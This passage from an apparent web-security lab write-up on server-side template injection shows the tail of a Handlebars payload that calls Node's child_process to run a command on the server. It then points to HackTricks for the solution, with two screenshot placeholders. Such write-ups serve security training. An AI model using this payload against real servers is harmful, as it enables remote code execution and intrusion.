        {{this.push "return require('child_process').spawn('pwd',[' ']).stdout.on('data', function (data) {console.log('own'+ data); });"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/8.png)

The solution is directly in https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection...




![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/9.png)

